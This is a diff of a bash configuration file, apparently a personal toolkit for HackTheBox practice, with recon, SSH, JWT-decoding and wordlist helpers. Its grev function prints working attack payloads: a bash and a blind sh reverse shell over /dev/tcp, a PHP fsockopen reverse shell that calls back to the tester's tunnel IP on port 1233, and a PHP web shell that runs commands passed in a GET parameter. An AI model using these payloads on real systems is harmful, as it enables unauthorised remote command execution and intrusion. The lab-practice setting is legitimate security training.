@@ -3,44 +3,50 @@
 alias gports="xmlstarlet sel -t -v '//port[state/@state=\"open\"]/@portid' -nl open | paste -s -d, -"
 
 # Returns different types of reverse shells
-function grev(){
+function grev() {
 	# Switch case for reverse shell type
 	case $1 in
-		"php")
-			echo "<?php echo '<pre>' . shell_exec(\$_GET['cmd']) . '</pre>'; ?>";
-			;;
-		*)
-			# Fallback to bash reverse shell
-			echo "bash -c 'bash -i >& /dev/tcp/$(gtunip)/1233 0>&1'"
-			;;
+	"php")
+    echo "<?php \$sock=fsockopen(\"$(gtunip)\",1233);shell_exec(\"sh <&3 >&3 2>&3\");?>"
+		;;
+	"rce-php")
+		echo "<?php echo '<pre>' . shell_exec(\$_GET['cmd']) . '</pre>'; ?>"
+		;;
+	"blind")
+		echo "(sh)0>/dev/tcp/$(gtunip)/1233"
+		;;
+	*)
+		# Fallback to bash reverse shell
+		echo "bash -c 'bash -i >& /dev/tcp/$(gtunip)/1233 0>&1'"
+		;;
 	esac
-			
+
 }
 
 # Executes a recon on the target ip
-function recon(){
+function recon() {
 	# Checks that $tip is setted
 	if [[ -z $tip ]]; then
-		echo "Target IP not setted";
-		return 1;
-	fi 	
-	
-	# Does initial scan
-	sudo nmap -sS --min-rate 5000 -p- --open -n -Pn $tip -vvv -oX open && \
+		echo "Target IP not setted"
+		return 1
+	fi
 
-	# Does deeper scan
-	sudo nmap -sCV -p$(gports) -Pn -oN details $tip -vvv;
+	# Does initial scan
+	sudo nmap -sS --min-rate 5000 -p- --open -n -Pn $tip -vvv -oX open &&
+
+		# Does deeper scan
+		sudo nmap -sCV -p$(gports) -Pn -oN details $tip -vvv
 
 	# Creates the initial writeup.md file
-	writeup="# Ports";
+	writeup="# Ports"
 	for port in $(gports | tr ',' '\n'); do
 		item="**$port** -"
 		item="$item *$(grep "$port/" details | awk '{print $(NF - 2)}')*"
 		item="$item (v$(grep "$port/" details | awk '{print $(NF - 1)}'))"
 
-		writeup="$writeup\n$item";
+		writeup="$writeup\n$item"
 	done
-	echo "$writeup" >> ../writeup.md;
+	echo "$writeup" >>../writeup.md
 }
 
 # Creates a new folder for a hackthebox machine
@@ -52,62 +58,64 @@ function htbc() {
 
 	#Creating machine directories
 	mkdir "/home/js/hacking/hackthebox/machines/$machine_lowername"
-	cd "$_" || exit;
+	cd "$_" || exit
 	mkdir recon content exploit recon/wfuzz
-	
+
 	#Creating obsidian writeup and symlink
 	touch writeup.md
 	ln -s "$(pwd)/writeup.md" "/home/js/documents/obsidian/Hacking/Machines/HackTheBox - $machine_name.md"
 
 	#Cd into recon and updating target ip
-	cd recon || exit;
-	upvar tip "$machine_ip";
-	upvar starting_path "$(pwd)";
+	cd recon || exit
+	upvar tip "$machine_ip"
+	upvar starting_path "$(pwd)"
 }
 
 # Logs in by ssh to the target ip address using a credentials file (user:pass)
 function sshcreds() {
-  # Read the credentials from the file
-  local creds_file="creds"
-  local creds_line
-  if [[ -f "$creds_file" ]]; then
-    creds_line=$(head -n 1 "$creds_file")
-  else
-    echo "Credentials file not found."
-    return 1
-  fi
+	# Read the credentials from the file
+	local creds_file="creds"
+	local creds_line
+	if [[ -f "$creds_file" ]]; then
+		creds_line=$(head -n 1 "$creds_file")
+	else
+		echo "Credentials file not found."
+		return 1
+	fi
 
-  # Extract the username and password from the credentials line
-  local username=${creds_line%%:*}
-  local password=${creds_line#*:}
+	# Extract the username and password from the credentials line
+	local username=${creds_line%%:*}
+	local password=${creds_line#*:}
 
-  local ip=$1
-  # Check if an IP address is provided
-  if [[ -z $1 ]]; then
-    echo "IP address not provided, using target ($tip)"
-    local ip="$tip"
-  fi
+	local ip=$1
+	# Check if an IP address is provided
+	if [[ -z $1 ]]; then
+		echo "IP address not provided, using target ($tip)"
+		local ip="$tip"
+	fi
 
-  # Form the SSH command
-  shift
-  local ssh_command="sshpass -p '$password' ssh -o StrictHostKeyChecking=no $username@$ip $@"
+	# Form the SSH command
+	shift
+	local ssh_command="sshpass -p '$password' ssh -o StrictHostKeyChecking=no $username@$ip $@"
 
-  # Execute the SSH command
-  echo "Logging in to $username@$ip..."
-  bash -c "$ssh_command";
+	# Execute the SSH command
+	echo "Logging in to $username@$ip..."
+	bash -c "$ssh_command"
 }
 
 decode_base64_url() {
-  local len=$((${#1} % 4))
-  local result="$1"
-  if [ $len -eq 2 ]; then result="$1"'=='
-  elif [ $len -eq 3 ]; then result="$1"'=' 
-  fi
-  echo "$result" | tr '_-' '/+' | openssl enc -d -base64
+	local len=$((${#1} % 4))
+	local result="$1"
+	if [ $len -eq 2 ]; then
+		result="$1"'=='
+	elif [ $len -eq 3 ]; then
+		result="$1"'='
+	fi
+	echo "$result" | tr '_-' '/+' | openssl enc -d -base64
 }
 
-decode_jwt(){
-   decode_base64_url $(echo -n $2 | cut -d "." -f $1) | jq .
+decode_jwt() {
+	decode_base64_url $(echo -n $2 | cut -d "." -f $1) | jq .
 }
 
 # Decode JWT header
@@ -127,3 +135,4 @@ export dotdotpwn='/home/js/hacking/wordlists/dotdotpwn.txt'
 export secrets='/home/js/hacking/wordlists/jwt.secrets.list'
 export nginx='/home/js/hacking/wordlists/nginx.txt'
 export springboot='/home/js/hacking/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt'
+export names='/home/js/hacking/wordlists/SecLists/Usernames/Names/names.txt'
